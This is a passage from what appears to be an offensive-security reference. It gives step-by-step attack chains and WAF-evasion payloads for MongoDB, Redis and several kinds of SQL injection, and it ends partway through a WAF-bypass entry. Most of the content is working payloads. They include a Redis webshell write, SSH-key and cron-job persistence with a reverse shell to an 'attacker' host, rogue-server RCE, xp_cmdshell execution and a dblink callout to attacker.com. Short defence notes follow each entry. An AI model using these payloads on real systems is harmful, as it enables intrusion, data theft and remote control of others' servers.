**Defensive Measures:** Defending against SQLite injection: use parameterized queries (PreparedStatement), strictly validate and filter user input, restrict database file permissions to prevent ATTACH operations, disable the load_extension() feature, and store the database file outside the web root.

---

### MongoDB Injection  `sqli-mongodb-basic`
_NoSQL database injection attack techniques_
Subcategory: **MongoDB** · tags: `nosql` `mongodb` `injection`

**Prerequisites:**
- The target uses MongoDB
- User input is concatenated into a query

**Attack Chain:**

**1. Probe for the injection point**
> Probe for MongoDB injection
```
{"username": "admin", "password": "password"}
{"username": "admin", "password": {"$ne": ""}}
{"username": "admin", "password": {"$gt": ""}}
```
**Syntax breakdown:**
- `$ne` — not-equal operator _variable_
- `$gt` — greater-than operator _variable_

**2. Bypass authentication**
> Bypass login authentication
```
{"username": "admin", "password": {"$ne": "wrongpass"}}
{"username": {"$ne": ""}, "password": {"$ne": ""}}
```
**Syntax breakdown:**
- `$ne` — not equal, returns all users whose password is not wrongpass _variable_

**3. Logical operator injection**
> Use the $or logical operator
```
{"username": "admin", "password": {"$or": [{"password": "realpass"}, {"1": "1"}]}}
```
**Syntax breakdown:**
- `$or` — OR operator _variable_

**4. Regex injection**
> Regular expression injection
```
{"username": {"$regex": "^admin"}, "password": {"$ne": ""}}
```
**Syntax breakdown:**
- `$regex` — regular expression matching operator _variable_
- `^admin` — starts with admin _value_

**5. $where injection**
> $where clause JavaScript injection
```
{"$where": "this.username == 'admin' && this.password.match(/.*/)"}
```
**Syntax breakdown:**
- `$where` — execute JavaScript code _variable_
- `this.username` — the field of the current document _value_

**6. Blind injection to extract data**
> Use regex to extract character by character
```
{"username": {"$regex": "^a"}}
{"username": {"$regex": "^ad"}}
{"username": {"$regex": "^adm"}}
Enumerate the username character by character
```
**Syntax breakdown:**
- `{"username":` — command/payload start _command_
- ` {"$regex": "^a"}}
{"username": {"$regex": "^ad"}}
{"username": {"$regex": "^adm"}}
Enumerate the username character by character` — parameters and payload content _value_

**WAF/EDR Bypass Variants:**

**Unicode bypass**
> Unicode encoding bypass
```
{"username": {"\u0024ne": ""}}
Use Unicode encoding for the $ symbol
```
**Syntax breakdown:**
- `\uXXXX` — Unicode encoding _encoding_

**Overview:** MongoDB is one of the most popular NoSQL databases; its queries use the JSON format rather than SQL syntax. NoSQL injection bypasses authentication or extracts data by manipulating query operators ($gt/$ne/$regex, etc.), and its attack surface is completely different from traditional SQL injection.

**Vulnerability Principle:** MongoDB injection uses JSON query operators to bypass authentication: $ne (not equal) bypasses password verification, $gt (greater than) matches any value, $regex performs regex blind injection to extract data, $where injects JavaScript code to execute server-side scripts, and aggregation pipeline injection performs complex data operations.

**Exploitation Method:** Complete exploitation flow:
1. Probe for the injection point
2. Use operators to bypass authentication
3. Use regex to extract data character by character
4. Attempt $where to execute JavaScript

**Defensive Measures:** Defenses:
1. Use parameterized queries
2. Input validation
3. Disable the $where operator
4. Least privilege principle

---

### Redis Unauthorized Access  `sqli-redis`
_Redis unauthorized access and command injection_
Subcategory: **Redis** · tags: `redis` `nosql` `injection`

**Prerequisites:**
- The Redis service is accessible
- Unauthorized or weak password

**Attack Chain:**

**1. Probe Redis**
> Probe the Redis service
```
redis-cli -h target.com ping
redis-cli -h target.com info
```
**Syntax breakdown:**
- `redis-cli` — Redis command-line client _value_
- `ping` — test the connection _command_
- `info` — obtain server information _value_

**2. Unauthorized access**
> Unauthorized access to Redis
```
redis-cli -h target.com
> INFO
> KEYS *
> GET sensitive_key
```
**Syntax breakdown:**
- `INFO` — obtain Redis information _value_
- `KEYS *` — list all keys _value_

**3. Write a Webshell**
> Write a Webshell
_platform: linux_
```
redis-cli -h target.com
> CONFIG SET dir /var/www/html/
> CONFIG SET dbfilename shell.php
> SET shell "<?php system($_GET['cmd']); ?>"
> SAVE
```
**Syntax breakdown:**
- `CONFIG SET dir` — set the RDB file save directory _value_
- `CONFIG SET dbfilename` — set the RDB filename _value_
- `SAVE` — save the database to a file _value_

**4. Write an SSH public key**
> Write an SSH public key
_platform: linux_
```
redis-cli -h target.com
> CONFIG SET dir /root/.ssh/
> CONFIG SET dbfilename authorized_keys
> SET sshkey "ssh-rsa AAAA..."
> SAVE
```
**Syntax breakdown:**
- `redis-cli -h target.com` — step 1 operation _command_
- `> CONFIG SET dir /root/.ssh/` — step 2 operation _value_
- `> CONFIG SET dbfilename authorized_keys` — step 3 operation _value_
- `> SET sshkey "ssh-rsa AAAA..."` — step 4 operation _value_
- `> SAVE` — step 5 operation _value_

**5. Write a Cron job**
> Write a Cron job
_platform: linux_
```
redis-cli -h target.com
> CONFIG SET dir /var/spool/cron/
> CONFIG SET dbfilename root
> SET cron "\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/attacker/4444 0>&1\n\n"
> SAVE
```
**Syntax breakdown:**
- `/var/spool/cron/` — the Cron job directory _path_
- `*/1 * * * *` — execute every minute _value_

**6. Master-slave replication RCE**
> Master-slave replication RCE
_platform: linux_
```
Use the redis-rogue-server tool:
python redis-rogue-server.py --rhost target.com --lhost attacker.com
Load a malicious module via master-slave replication to execute commands
```
**Syntax breakdown:**
- `Use the redis-rogue-server tool:` — step 1 operation _command_
- `python redis-rogue-server.py --rhost target.com --lhost attacker.com` — step 2 operation _value_
- `Load a malicious module via master-slave replication to execute commands` — step 3 operation _value_

**WAF/EDR Bypass Variants:**

**Redis command obfuscation bypass**
> Obfuscate Redis commands to bypass WAF detection by splitting command strings with quotes, concatenating variables, and so on
```
redis-cli -h target.com
> "C""O""N""F""I""G" SET dir /var/www/html/
> $(printf 'CONF')$(printf 'IG') SET dbfilename shell.php
> SET shell "<?php system(\$_GET['cmd']); ?>"
> SAVE
```
**Syntax breakdown:**
- `system()` — system command execution _function_
- `$()` — command substitution _operator_

**Redis Lua script execution bypass**
> Indirectly call Redis commands by executing a Lua script via EVAL, bypassing detection of direct commands such as CONFIG/SET
```
redis-cli -h target.com
> EVAL "redis.call('set','shell','<?php system(\$_GET[c]); ?>')" 0
> EVAL "redis.call('config','set','dir','/var/www/html/')" 0
> EVAL "redis.call('config','set','dbfilename','test.php')" 0
> EVAL "redis.call('save')" 0
```
**Syntax breakdown:**
- `system()` — system command execution _function_

**Overview:** Redis is a high-performance key-value storage system, often used as a cache and message queue. Redis injection executes arbitrary Redis commands via CRLF injection or unauthorized access, which can lead to data leakage, writing a webshell, or even RCE via master-slave replication.

**Vulnerability Principle:** Redis vulnerabilities mainly include: unauthorized access (no password by default) leading to arbitrary command execution, CRLF injection to inject malicious Redis commands into a legitimate request, CONFIG SET to modify the persistence path to write a crontab or SSH public key, and loading a malicious module via master-slave replication to achieve RCE.

**Exploitation Method:** Complete exploitation flow:
1. Probe the Redis service
2. Attempt unauthorized access
3. Write a Webshell/SSH public key/Cron job
4. Or use master-slave replication RCE

**Defensive Measures:** Defenses:
1) Set a strong password
2) Bind to an internal IP
3) Disable the CONFIG command
4) Run Redis as an ordinary user

---

### Boolean Blind Injection  `sqli-blind`
_Boolean-condition-based SQL blind injection techniques_
Subcategory: **Blind Injection** · tags: `sqli` `blind` `boolean`

**Prerequisites:**
- A SQL injection exists
- The page has two different responses for true/false

**Attack Chain:**

**1. Confirm the blind injection**
> Confirm boolean blind injection
```
' AND 1=1-- (returns normally)
' AND 1=2-- (returns abnormally)
Confirm boolean blind injection exists
```
**Syntax breakdown:**
- `AND 1=1` — always-true condition _value_
- `AND 1=2` — always-false condition _value_

**2. Obtain the database name length**
> Enumerate the database name length
```
' AND LENGTH(database())=1--
' AND LENGTH(database())=2--
...
' AND LENGTH(database())=N--
Until it returns normally
```
**Syntax breakdown:**
- `LENGTH()` — returns the string length _function_

**3. Enumerate the database name character by character**
> Extract the database name character by character
```
' AND ASCII(SUBSTRING(database(),1,1))>97--
' AND ASCII(SUBSTRING(database(),1,1))>100--
...
Use binary search to quickly locate the character
```
**Syntax breakdown:**
- `SUBSTRING(str,pos,len)` — extract a substring _value_
- `ASCII()` — returns the ASCII code value _function_

**4. Automate with a tool**
> Automate with sqlmap
```
sqlmap -u "http://target.com?id=1" --technique=B --dbs
Use sqlmap for boolean blind injection
```
**Syntax breakdown:**
- `--technique=B` — specify the boolean blind injection technique _parameter_
- `--dbs` — enumerate databases _parameter_

**WAF/EDR Bypass Variants:**

**Boolean blind injection conditional expression substitution**
> Use CASE WHEN to replace IF(), MID() to replace SUBSTRING(), LEFT/RIGHT combinations for substring extraction, and BETWEEN to replace greater-than/less-than comparisons
```
' AND (CASE WHEN (MID(database(),1,1)='a') THEN 1 ELSE 0 END)=1--
' AND LEFT(database(),1)>'a'--
' AND RIGHT(LEFT(database(),2),1)='d'--
' AND ORD(MID(database(),1,1))BETWEEN 97 AND 122--
```
**Syntax breakdown:**
- `CASE WHEN` — conditional expression _keyword_
- `SUBSTRING` — string substring _function_
- `--` — SQL comment _operator_

**Boolean blind injection arithmetic and bitwise operation bypass**
> Use HEX/CONV for encoding comparison, bitwise AND (&) to determine the character range, POW() math function obfuscation, and DIV to replace AND
```
' AND (SELECT CONV(HEX(SUBSTR(database(),1,1)),16,10))>96--
' AND (SELECT ORD(MID(database(),1,1))&0x40)=0x40--
' AND (SELECT POW(ORD(MID(database(),1,1)),0))+0=1--
' DIV 1 AND (SELECT LENGTH(database()))>0--
```
**Syntax breakdown:**
- `SELECT` — query data _keyword_
- `SUBSTRING` — string substring _function_
- `HEX()` — hexadecimal encoding _encoding_
- `--` — SQL comment _operator_

**Overview:** SQL blind injection refers to the scenario where injection succeeds but the page does not directly echo the data, requiring conditional determination (boolean blind injection) or time delay (time-based blind injection) to infer the data character by character. It is the most common injection type in practice.

**Vulnerability Principle:** SQL blind injection vulnerabilities exist in all queries that are not correctly parameterized. An attacker constructs boolean conditions (AND 1=1 vs AND 1=2) to observe page differences, or uses delay functions such as SLEEP/BENCHMARK to determine the truth of a condition, extracting arbitrary information from the database bit by bit.

**Exploitation Method:** Complete exploitation flow:
1. Confirm boolean blind injection exists
2. Enumerate the data length
3. Extract data character by character
4. Automate with a tool

**Defensive Measures:** Defending against SQL blind injection: use parameterized queries/prepared statements, enforce WAF rules to detect abnormal conditional statements and delay functions, monitor the slow query log to find abnormal SLEEP requests, set a database query timeout limit, and deploy RASP for real-time SQL injection detection.

---

### Time-Based Blind Injection  `sqli-time-based`
_Time-delay-based SQL blind injection techniques_
Subcategory: **Blind Injection** · tags: `sqli` `blind` `time`

**Prerequisites:**
- A SQL injection exists
- The page response time is controllable

**Attack Chain:**

**1. Confirm time-based blind injection**
> Confirm time-based blind injection
```
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--
Observe whether the response is delayed by 5 seconds
```
**Syntax breakdown:**
- `SLEEP(5)` — MySQL delay of 5 seconds _value_
- `IF(cond,true,false)` — conditional determination function _value_

**2. Obtain the database name length**
> Enumerate the database name length
```
' AND IF(LENGTH(database())=N,SLEEP(5),0)--
Enumerate the database name length
```
**Syntax breakdown:**
- `SLEEP()` — delay function _function_
- `--` — SQL comment _operator_

**3. Extract character by character**
> Extract data character by character
```
' AND IF(ASCII(SUBSTRING(database(),1,1))>97,SLEEP(5),0)--
Use binary search to extract the character
```
**Syntax breakdown:**
- `SLEEP()` — delay function _function_
- `--` — SQL comment _operator_

**4. Delay functions for different databases**
> Delay functions for each database
```
MySQL: SLEEP(5), BENCHMARK()
MSSQL: WAITFOR DELAY '0:0:5'
PostgreSQL: pg_sleep(5)
Oracle: DBMS_LOCK.SLEEP(5)
```
**Syntax breakdown:**
- `WAITFOR DELAY` — MSSQL delay _value_
- `pg_sleep()` — PostgreSQL delay _function_

**WAF/EDR Bypass Variants:**

**Time delay substitute function bypass**
> Use BENCHMARK() to replace SLEEP(), a Cartesian product re-query to consume time, GET_LOCK() lock waiting, and CASE conditions to trigger a delay
```
' AND BENCHMARK(5000000,SHA1('test'))--
' AND (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C)--
' AND GET_LOCK('sqli_test',5)--
' AND (CASE WHEN database() LIKE '%' THEN BENCHMARK(3000000,MD5('x')) ELSE 0 END)--
```
**Syntax breakdown:**
- `SELECT...FROM` — query data _keyword_
- `information_schema` — the metadata database _value_
- `BENCHMARK` — benchmark test delay _function_
- `CASE WHEN` — conditional expression _keyword_
- `--` — SQL comment _operator_

**Cross-database time delay bypass**
> Use time delay methods specific to each database: PostgreSQL's pg_sleep condition trigger, MSSQL's IF condition WAITFOR, and Oracle's DBMS_PIPE.RECEIVE_MESSAGE to replace DBMS_LOCK
```
PostgreSQL: ' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--
MSSQL: '; IF (1=1) WAITFOR DELAY '0:0:5'--
Oracle: ' AND 1=CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('x',5) ELSE 0 END--
MySQL: ' AND (SELECT SLEEP(5) FROM DUAL WHERE 1=1)--
```
**Syntax breakdown:**
- `SELECT...FROM` — query data _keyword_
- `WHERE` — condition filtering _keyword_
- `SLEEP()` — time delay _function_
- `WAITFOR DELAY` — MSSQL delay _keyword_
- `CASE WHEN` — conditional expression _keyword_
- `--` — SQL comment _operator_

**Overview:** SQL time-based blind injection determines the truth of a condition by injecting a delay function (such as SLEEP/WAITFOR/pg_sleep), applicable to scenarios where the page has no observable difference. It is the most stealthy but least efficient injection method.

**Vulnerability Principle:** SQL time-based blind injection uses the database's built-in delay functionality: MySQL's SLEEP() and BENCHMARK(), MSSQL's WAITFOR DELAY, PostgreSQL's pg_sleep(), and Oracle's DBMS_LOCK.SLEEP(). A conditional statement controls the delay trigger to infer the target data character by character.

**Exploitation Method:** Complete exploitation flow:
1. Confirm time-based blind injection exists
2. Enumerate the data length
3. Extract character by character
4. Automate with sqlmap

**Defensive Measures:** Defending against SQL time-based blind injection: in addition to parameterized queries, set a strict database query timeout (such as 5 seconds), monitor abnormal slow query patterns, have the WAF detect delay function keywords such as SLEEP/WAITFOR/BENCHMARK, and limit the number of concurrent queries per IP.

---

### Error-Based Injection  `sqli-error-based`
_SQL injection that uses error messages to extract data_
Subcategory: **Error-Based Injection** · tags: `sqli` `error` `extractvalue`

**Prerequisites:**
- A SQL injection exists
- Error messages are displayed on the page

**Attack Chain:**

**1. Confirm error-based injection**
> Test error-based injection
```
' AND extractvalue(1,concat(0x7e,version()))--
' AND updatexml(1,concat(0x7e,version()),1)--
```
**Syntax breakdown:**
- `extractvalue()` — MySQL XML extraction function _function_
- `updatexml()` — MySQL XML update function _function_
- `concat(0x7e,...)` — concatenate a tilde marker _value_

**2. Obtain database information**
> Obtain basic information
```
' AND extractvalue(1,concat(0x7e,database()))--
' AND extractvalue(1,concat(0x7e,user()))--
' AND extractvalue(1,concat(0x7e,version()))--
```
**Syntax breakdown:**
- `CONCAT` — string concatenation _function_
- `--` — SQL comment _operator_
- `EXTRACTVALUE` — error-based injection function _function_

**3. Obtain table names**
> Obtain table names
```
' AND extractvalue(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())))--
```
**Syntax breakdown:**
- `SELECT` — query data _keyword_
- `CONCAT` — string concatenation _function_
- `information_schema` — the metadata database _value_
- `--` — SQL comment _operator_

**4. Obtain data**
> Extract data
```
' AND extractvalue(1,concat(0x7e,(SELECT password FROM users LIMIT 0,1)))--
```
**Syntax breakdown:**
- `SELECT` — query data _keyword_
- `CONCAT` — string concatenation _function_
- `--` — SQL comment _operator_
- `EXTRACTVALUE` — error-based injection function _function_

**5. Other error functions**
> Other error-based injection methods
```
' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
' AND EXP(~(SELECT * FROM (SELECT version())a))--
```
**Syntax breakdown:**
- `FLOOR(RAND(0)*2)` — produces a duplicate key error _value_
- `EXP()` — math function overflow error _function_

**WAF/EDR Bypass Variants:**

**Substitute error function bypass**
> Use obscure functions such as the GEOMETRYCOLLECTION spatial function, JSON_KEYS, and ST_LatFromGeoHash to replace extractvalue/updatexml to trigger the error
```
' AND GEOMETRYCOLLECTION((SELECT * FROM (SELECT * FROM (SELECT version())a)b))--
' AND (SELECT 1 FROM (SELECT NTILE(1) OVER(ORDER BY (SELECT version())))a)--
' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,version())) USING utf8)))--
' AND ST_LatFromGeoHash(version())--
```
**Syntax breakdown:**
- `SELECT...FROM` — query data _keyword_
- `CONCAT` — string concatenation _function_
- `ORDER BY` — sorting/column count probing _keyword_
- `--` — SQL comment _operator_

**Encoding and scientific notation bypass**
> Use unhex(hex()) double-layer encoding, EXP() scientific notation overflow, and double URL encoding (%26%26 to replace AND) to bypass WAF detection
```
' AND extractvalue(1,concat(0x7e,(SELECT unhex(hex(database())))))--
' AND 1=1 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7e,database(),0x7e) x)a))--
' AND (SELECT 1 FROM (SELECT count(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.schemata GROUP BY x)a)--
' %26%26 updatexml(1,concat(0x7e,(select%20database())),1)--%20
```
**Syntax breakdown:**
- `SELECT...FROM` — query data _keyword_
- `information_schema` — the metadata database _value_
- `CONCAT` — string concatenation _function_
- `HEX()` — hexadecimal encoding _encoding_
- `UNHEX()` — hexadecimal decoding _encoding_
- `--` — SQL comment _operator_
- `%xx` — URL encoding _encoding_

**Overview:** SQL error-based injection uses database error messages to directly echo data, constructing specific function calls (such as updatexml/extractvalue/exp) to make the database output the query result in the error message, which is far more efficient than blind injection.

**Vulnerability Principle:** SQL error-based injection uses the fact that the database exposes internal data in error messages when processing illegal input: MySQL's updatexml()/extractvalue()/exp() overflow, MSSQL's convert()/cast() type conversion errors, PostgreSQL's cast() errors, and Oracle's XMLType() and other functions.

**Exploitation Method:** Complete exploitation flow:
1. Confirm error-based injection exists
2. Use extractvalue/updatexml to extract data
3. Enumerate the database structure
4. Extract sensitive data

**Defensive Measures:** Defending against SQL error-based injection: the production environment must turn off detailed error message display (display_errors=off), use a custom error page instead of the default database error, log errors but not display them to the user, and use parameterized queries to fundamentally prevent injection.

---

### Second-Order SQL Injection  `sqli-second-order`
_SQL injection triggered after storage_
Subcategory: **Second-Order Injection** · tags: `sqli` `second-order` `stored`

**Prerequisites:**
- A data storage feature exists
- The stored data is used a second time

**Attack Chain:**

**1. Probe for second-order injection**
> Probe for the second-order injection point
```
Register username: admin'--
Or: admin' OR '1'='1
After logging in, check whether it affects other features
```
**Syntax breakdown:**
- `OR '1'='1'` — logically always true _keyword_
- `--` — SQL comment _operator_

**2. Username injection**
> Trigger injection via the username
```
Register user: admin' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT password FROM users LIMIT 1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -
Log in to trigger error-based injection
```
**Syntax breakdown:**
- `FLOOR(RAND(0)*2)` — key to error-based injection _value_
- `GROUP BY x` — triggers a duplicate key error _value_

**3. Password reset injection**
> Password reset feature injection
```
Enter email: ' OR '1'='1
May trigger a password reset for all users
```
**Syntax breakdown:**
- `OR '1'='1'` — logically always true _keyword_

**4. Order/comment injection**
> Trigger injection via a comment
```
Submit comment: ' UNION SELECT username,password FROM users--
Triggered when the administrator views the comment
```
**Syntax breakdown:**
- `UNION` — merge query results _keyword_
- `SELECT...FROM` — query data _keyword_
- `--` — SQL comment _operator_

**WAF/EDR Bypass Variants:**

**Encoded storage trigger bypass**
> Use comment truncation (/**/) or CHAR() encoding to construct the payload during the storage phase; the WAF cannot detect the malicious SQL at input, but it is automatically triggered when the database uses it a second time
```
Register username: admin'/*
Later when modifying the password, the SQL becomes: UPDATE users SET password='new' WHERE username='admin'/*'

Register username: CONCAT(CHAR(39),CHAR(32),CHAR(79),CHAR(82),CHAR(32),CHAR(39),CHAR(49),CHAR(39),CHAR(61),CHAR(39),CHAR(49))
After storage, it is automatically decoded and triggers injection when used a second time
```
**Syntax breakdown:**
- `WHERE` — condition filtering _keyword_
- `UPDATE...SET` — update data _keyword_
- `CONCAT` — string concatenation _function_

**Unicode normalization bypass**
> Use Unicode full-width character (U+FF07) normalization, escape sequence restoration, and filtering differences across functional modules to bypass WAF detection
```
Register username: admin＇ OR ＇1＇=＇1
(use the full-width quote U+FF07, triggered after the database normalizes it to half-width)

Register email: test@test.com' UNION SELECT password FROM users WHERE '1'='1
(the email passes the WAF validation but is triggered when concatenated in other queries after storage)

Comment content: \x27 OR 1=1--
(the escape sequence is restored to a single quote at the storage layer)
```
**Syntax breakdown:**
- `UNION` — merge query results _keyword_
- `SELECT...FROM` — query data _keyword_
- `WHERE` — condition filtering _keyword_
- `OR '1'='1'` — logically always true _keyword_
- `--` — SQL comment _operator_

**Overview:** SQL second-order injection refers to malicious input that is correctly escaped when first stored but used without escaping in a subsequent query, triggering injection. Because the input and trigger are separated, this vulnerability is extremely difficult to discover with automated tools.

**Vulnerability Principle:** The root cause of SQL second-order injection is that the developer uses parameterized queries or escaping when writing data, but directly concatenates the data into the SQL statement when reading and using it again. A typical scenario includes storing a malicious username during user registration and triggering injection when modifying the password.

**Exploitation Method:** Second-order injection exploitation steps: 1) register a username containing a SQL payload (such as admin'-- ) 2) log into the account normally 3) trigger a feature that uses the username (such as modifying the password) 4) the backend SQL concatenates the unescaped username, triggering injection 5) use the injection to steal or modify other users' data.

**Defensive Measures:** Defending against second-order injection: perform parameterized queries on all data every time it is used, not only when writing but also when reading and reusing it. Establish a secure coding standard: any data from the database should be treated as untrusted input.

---

### Union Query Injection  `sqli-union`
_Use UNION SELECT to extract data_
Subcategory: **Union Query** · tags: `sqli` `union` `select`

**Prerequisites:**
- An injection point exists
- The query result can be displayed

**Attack Chain:**

**1. Determine the number of columns**
> Determine the number of columns
```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
Until an error
Or:
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```
**Syntax breakdown:**
- `ORDER BY` — sort by column to determine the number of columns _value_
- `NULL,NULL` — add NULLs one by one to determine the number of columns _value_

**2. Determine the display columns**
> Determine the display position
```
' UNION SELECT 1,2,3--
' UNION SELECT 'a','b','c'--
Find out which columns are displayed on the page
```
**Syntax breakdown:**
- `UNION` — merge query result sets _keyword_
- `SELECT` — query data _keyword_
- `--` — SQL comment _operator_

**3. Extract data**
> Extract data
```
' UNION SELECT username,password,3 FROM users--
' UNION SELECT table_name,2,3 FROM information_schema.tables--
```
**Syntax breakdown:**
- `UNION` — merge query result sets _keyword_
- `SELECT` — query data _keyword_
- `information_schema` — the metadata database _value_
- `--` — SQL comment _operator_

**4. Bypass filtering**
> Bypass keyword filtering
```
' /*!UNION*/ /*!SELECT*/ 1,2,3--
' UnIoN SeLeCt 1,2,3--
' UNION/**/SELECT/**/1,2,3--
```
**Syntax breakdown:**
- `UNION` — merge query result sets _keyword_
- `SELECT` — query data _keyword_
- `--` — SQL comment _operator_

**WAF/EDR Bypass Variants:**

**UNION injection keyword bypass**
> Use the MySQL version comment /*!50000*/, URL-encode the UNION/SELECT keywords, %23 newline bypass, and whitespace character obfuscation (%09 TAB, %0d CR, %0b VT)
```
' /*!50000UNION*/ /*!50000SELECT*/ 1,database(),3--
' %55%4e%49%4f%4e %53%45%4c%45%43%54 1,2,3--
' uNiOn%23%0aSeLeCt 1,2,3--
' UNION%0a%09%0d%0bSELECT%0a1,2,3--
```
**Syntax breakdown:**
- `UNION` — merge query results _keyword_
- `SELECT` — query data _keyword_
- `--` — SQL comment _operator_
- `/*...*/` — inline comment _operator_
- `%xx` — URL encoding _encoding_

**UNION injection null byte and chunked bypass**
> Use a null byte (%00) to truncate WAF detection, UNION ALL to bypass deduplication detection, HTTP chunked transfer encoding to scatter keywords into different chunks, and a custom SEPARATOR to replace the default comma
```
' UNION%00SELECT 1,2,3--
' /*!UNION*/%20/*!ALL*//*!SELECT*/ 1,2,3--
Transfer-Encoding: chunked

5
UNION
7
 SELECT
1
 
0

' UNION SELECT 1,group_concat(table_name SEPARATOR 0x3c62723e),3 FROM information_schema.tables WHERE table_schema=database()--
```
**Syntax breakdown:**
- `UNION` — merge query results _keyword_
- `SELECT...FROM` — query data _keyword_
- `WHERE` — condition filtering _keyword_
- `information_schema` — the metadata database _value_
- `CONCAT` — string concatenation _function_
- `GROUP_CONCAT` — grouped concatenation _function_
- `--` — SQL comment _operator_
- `/*...*/` — inline comment _operator_
- `%xx` — URL encoding _encoding_
- `Transfer-Encoding` — transfer encoding header _header_
- `chunked` — chunked transfer _keyword_

**Overview:** UNION query injection merges the attacker's query result with the original query output via UNION SELECT. It is the most efficient injection method for data extraction, obtaining entire rows and columns of data at once.

**Vulnerability Principle:** UNION injection requires the attacker's SELECT clause to have the same number of columns and compatible data types as the original query. Before exploitation, the number of columns must be determined (the ORDER BY incrementing method or the UNION SELECT NULL method), then NULL is gradually replaced with the target field to extract the database name, table name, column name, and data.

**Exploitation Method:** UNION injection steps: 1) ORDER BY N to determine the number of columns 2) UNION SELECT NULL,... to find the echo position 3) replace the echo position with version()/database() 4) query information_schema to obtain table names and column names 5) UNION SELECT to extract the target data (usernames, password hashes, etc.).

**Defensive Measures:** Defending against UNION injection: use parameterized queries (most effective), deploy a WAF to detect UNION SELECT keyword combinations, limit the number of columns and rows returned by the query, restrict access permissions to information_schema, and minimize the database user's permissions.

---

### Stacked Query Injection  `sqli-stacked`
_Injection that executes multiple SQL statements_
Subcategory: **Stacked Queries** · tags: `sqli` `stacked` `queries`

**Prerequisites:**
- Multi-statement execution is supported
- MySQL/PostgreSQL/MSSQL

**Attack Chain:**

**1. Probe for stacked queries**
> Probe whether stacked queries are supported
```
'; SELECT SLEEP(5)--
'; SELECT 1--
'; WAITFOR DELAY '0:0:5'--
```
**Syntax breakdown:**
- `SELECT` — query data _keyword_
- `SLEEP()` — delay function _function_
- `WAITFOR DELAY` — MSSQL delay _function_
- `--` — SQL comment _operator_

**2. MySQL stacked queries**
> MySQL executes multiple statements
_platform: linux_
```
'; INSERT INTO users(username,password) VALUES('hacker','hacked');--
'; UPDATE users SET password='hacked' WHERE username='admin';--
'; SELECT SLEEP(5);--
> ⚠️ Only verify the existence of stacked injection, never use DROP/TRUNCATE/DELETE
```
**Syntax breakdown:**
- `;` — statement separator _operator_
- `INSERT INTO` — insert data _value_

**3. MSSQL stacked queries**
> MSSQL executes commands
_platform: windows_
```
'; EXEC xp_cmdshell('whoami');--
'; EXEC sp_executesql N'SELECT * FROM users';--
```
**Syntax breakdown:**
- `SELECT` — query data _keyword_
- `--` — SQL comment _operator_
- `EXEC` — execute a stored procedure _keyword_
- `xp_cmdshell` — system command execution _function_

**4. PostgreSQL stacked queries**
> PostgreSQL reads a file
_platform: linux_
```
'; COPY users FROM '/etc/passwd';--
'; SELECT * FROM pg_read_file('/etc/passwd');--
```
**Syntax breakdown:**
- `SELECT` — query data _keyword_
- `--` — SQL comment _operator_

**WAF/EDR Bypass Variants:**

**Stacked query terminator substitution bypass**
> Use a URL-encoded semicolon (%3B), newline separation, an inline comment wrapping SELECT, and PREPARE prepared execution of a hex-encoded query statement
```
' %3B SELECT user()--
' ;%0a SELECT user()--
' ; /*!SELECT*/ user()--
'; SET @q=0x53454C45435420757365722829; PREPARE stmt FROM @q; EXECUTE stmt;--
```
**Syntax breakdown:**
- `SELECT...FROM` — query data _keyword_
- `--` — SQL comment _operator_
- `/*...*/` — inline comment _operator_
- `%xx` — URL encoding _encoding_

**Stacked query conditional execution bypass**
> Use string concatenation to split command keywords, CHAR() to encode command arguments, CASE conditional execution, and a PostgreSQL DO block to execute complex logic
```
'; IF(1=1) EXEC('wh'+'oam'+'i');--
'; DECLARE @s VARCHAR(100)=CHAR(119)+CHAR(104)+CHAR(111)+CHAR(97)+CHAR(109)+CHAR(105); EXEC xp_cmdshell @s;--
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) END;--
'; DO $$ BEGIN PERFORM dblink_connect('host=attacker.com dbname=test'); END $$;--
```
**Syntax breakdown:**
- `SELECT` — query data _keyword_
- `SLEEP()` — time delay _function_
- `xp_cmdshell` — system command execution _function_
- `EXEC` — execute a stored procedure _keyword_
- `CASE WHEN` — conditional expression _keyword_
- `--` — SQL comment _operator_

**Overview:** SQL stacked query injection separates multiple SQL statements with a semicolon (;), and can execute INSERT/UPDATE/DELETE or even create stored procedures in a single request, with harm far exceeding ordinary SELECT injection.

**Vulnerability Principle:** SQL stacked queries are supported by default in MSSQL and PostgreSQL, and in MySQL only under PHP's mysqli_multi_query(). This vulnerability can execute arbitrary DML/DDL operations: insert an admin account, modify passwords, delete data, create a backdoor stored procedure, or even execute system commands.

**Exploitation Method:** Stacked injection exploitation: 1) confirm the target supports stacked queries (;SELECT SLEEP(2)) 2) execute INSERT to add an admin account 3) execute UPDATE to modify an existing account's password 4) in an MSSQL environment, enable and call xp_cmdshell to execute system commands 5) under PostgreSQL, write a file via COPY TO.

**Defensive Measures:** Defending against stacked query injection: use parameterized queries, disable multi-statement execution in the database connection configuration, restrict the database account's permissions (prohibit CREATE/DROP/ALTER), have the WAF detect semicolon-separated multi-statement patterns, and regularly audit the database operation log.

---

### SQL Injection WAF Bypass  `sqli-waf-bypass`
_Techniques for bypassing the Web Application Firewall_
Subcategory: **WAF Bypass** · tags: `sqli` `waf` `bypass`

**Prerequisites:**
- The target has a SQL injection point
- WAF protection exists

**Attack Chain:**

**Chunked transfer encoding**
> Use chunked transfer to bypass WAF detection
```
Transfer-Encoding: chunked

2
id
1
=
1
1

0
```
**Syntax breakdown:**
- `Transfer-Encoding` — transfer encoding header _header_
- `chunked` — chunked transfer _keyword_

**HTTP Parameter Pollution (HPP)**
> Use HPP to split the malicious payload
```
